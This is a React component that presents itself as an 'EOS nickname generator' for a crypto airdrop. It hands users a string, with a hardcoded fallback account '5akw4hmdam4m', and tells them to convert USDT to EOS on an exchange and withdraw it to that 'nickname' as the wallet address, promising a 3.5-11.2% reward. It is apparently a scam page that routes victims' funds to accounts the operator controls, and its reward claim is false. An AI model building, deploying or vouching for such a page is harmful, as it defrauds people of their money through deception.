import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";
import { Copy } from "lucide-react";
import nicknames from "../data/nicknames.json";

const generateEOSNickname = (): string => {
  try {
    const availableNicknames = nicknames.nicknames;
    if (!Array.isArray(availableNicknames) || availableNicknames.length === 0) {
      throw new Error("No nicknames available");
    }
    return availableNicknames[Math.floor(Math.random() * availableNicknames.length)];
  } catch (error) {
    console.error("Error generating nickname:", error);
    return "5akw4hmdam4m"; // Fallback default nickname
  }
};

export const NicknameGenerator: React.FC = () => {
  const [nickname, setNickname] = useState("");
  const [isGenerated, setIsGenerated] = useState(false);

  const handleGenerate = () => {
    try {
      const newNickname = generateEOSNickname();
      setNickname(newNickname);
      setIsGenerated(true);
      toast.success("New nickname generated!");
    } catch (error) {
      toast.error("Failed to generate nickname. Please try again.");
    }
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(nickname);
      toast.success("Copied to clipboard!");
    } catch (error) {
      toast.error("Failed to copy. Please try manually.");
    }
  };

  return (
    <div className="w-full max-w-md mx-auto space-y-6 animate-fade-in">
      <div className="space-y-4">
        <div className="relative">
          <Input
            value={nickname}
            readOnly
            placeholder="Generate your EOS nickname"
            className="bg-muted text-lg text-center py-6"
          />
          {nickname && (
            <Button
              variant="ghost"
              size="icon"
              className="absolute right-2 top-1/2 -translate-y-1/2 hover:bg-muted"
              onClick={handleCopy}
            >
              <Copy className="h-4 w-4" />
            </Button>
          )}
        </div>
        
        <Button 
          onClick={handleGenerate}
          disabled={isGenerated}
          className="w-full bg-gradient-to-r from-[#9b87f5] to-[#7E69AB] hover:opacity-90 transition-opacity disabled:opacity-50"
        >
          Generate Nickname
        </Button>

        {isGenerated && (
          <div className="mt-8 space-y-4 text-sm text-muted-foreground border border-muted rounded-lg p-4 animate-fade-in">
            <h3 className="font-semibold text-foreground">Instructions:</h3>
            <ol className="list-decimal list-inside space-y-2">
              <li>Go to your profile in your CEX (Binance, Bybit, Bitget, Mexc, etc...)</li>
              <li>Convert your USDT to EOS</li>
              <li>Go to your EOS balance and click withdrawal</li>
              <li>Enter the Nickname you received in the wallet address</li>
              <li>After you send yourself the EOS, you will be rewarded with 3.5-11.2% airdrop</li>
            </ol>
          </div>
        )}
      </div>
    </div>
  );
};